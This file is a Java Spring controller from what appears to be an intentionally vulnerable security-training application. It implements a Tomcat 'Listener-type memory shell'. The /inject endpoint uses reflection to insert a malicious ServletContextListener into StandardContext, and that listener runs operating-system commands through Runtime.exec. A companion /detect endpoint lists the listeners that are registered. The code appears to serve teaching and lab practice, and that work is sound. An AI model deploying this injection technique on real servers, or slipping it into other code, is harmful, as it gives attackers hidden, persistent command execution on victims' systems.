package top.whgojp.modules.mshell.controller;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import io.swagger.annotations.ApiParam;
import lombok.extern.slf4j.Slf4j;
import org.apache.catalina.Context;
import org.apache.catalina.core.StandardContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import top.whgojp.common.utils.R;

import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

/**
 * Listener型内存马
 * 通过动态注册ServletContextListener实现命令执行
 * 
 * @author whgojp
 * @date 2024/03/20
 */
@Slf4j
@Api(tags = "Listener型内存马")
@Controller
@RequestMapping("/mshell/listener")
public class ListenerMemShellController extends BaseMemShellController {

    @RequestMapping("")
    public String index() {
        return "vul/mshell/listener";
    }

    @ApiOperation("注入Listener型内存马")
    @PostMapping("/inject")
    @ResponseBody
    public R inject(
            @ApiParam("监听器名称") @RequestParam(defaultValue = "evilListener") String listenerName,
            @ApiParam("命令参数名") @RequestParam(defaultValue = "cmd") String cmdParam) {
        try {
            Context context = getContext();
            if (context == null) {
                return R.error("获取Context失败");
            }

            // 创建恶意Listener
            ServletContextListener evilListener = new ServletContextListener() {
                @Override
                public void contextInitialized(ServletContextEvent sce) {
                    try {
                        String cmd = sce.getServletContext().getInitParameter(cmdParam);
                        if (cmd != null) {
                            Process process = Runtime.getRuntime().exec(cmd);
                            InputStream in = process.getInputStream();
                            byte[] b = new byte[1024];
                            int n;
                            while ((n = in.read(b)) != -1) {
                                log.info(new String(b, 0, n));
                            }
                        }
                    } catch (IOException e) {
                        log.error("命令执行失败", e);
                    }
                }

                @Override
                public void contextDestroyed(ServletContextEvent sce) {
                    // 在Web应用关闭时执行
                }
            };

            // 获取applicationLifecycleListeners
            Field field = StandardContext.class.getDeclaredField("applicationLifecycleListeners");
            field.setAccessible(true);
            Object[] listeners = (Object[]) field.get(context);

            // 创建新的监听器数组
            List<Object> newListeners = new ArrayList<>();
            if (listeners != null) {
                for (Object listener : listeners) {
                    newListeners.add(listener);
                }
            }
            newListeners.add(evilListener);

            // 更新监听器数组
            field.set(context, newListeners.toArray(new Object[0]));

            log.info("Listener型内存马注入成功，名称: {}, 命令参数: {}", 
                    listenerName, cmdParam);
            return R.ok("内存马注入成功").put("data", String.format(
                    "Listener名称: %s\n命令参数: %s", 
                    listenerName, cmdParam));
        } catch (Exception e) {
            log.error("注入失败", e);
            return R.error("注入失败：" + e.getMessage());
        }
    }

    @ApiOperation("检测Listener型内存马")
    @GetMapping("/detect")
    @ResponseBody
    public R detect() {
        try {
            Context context = getContext();
            if (context == null) {
                return R.error("获取Context失败");
            }

            StringBuilder result = new StringBuilder();
            result.append("已注入的监听器列表：\n");

            // 获取applicationLifecycleListeners
            Field field = StandardContext.class.getDeclaredField("applicationLifecycleListeners");
            field.setAccessible(true);
            Object[] listeners = (Object[]) field.get(context);

            if (listeners != null) {
                for (Object listener : listeners) {
                    result.append("- 监听器类型: ").append(listener.getClass().getName())
                          .append("\n  实例: ").append(listener)
                          .append("\n");
                }
            } else {
                result.append("未找到任何监听器\n");
            }

            return R.ok().put("data", result.toString());
        } catch (Exception e) {
            log.error("检测失败", e);
            return R.error("检测失败：" + e.getMessage());
        }
    }
}
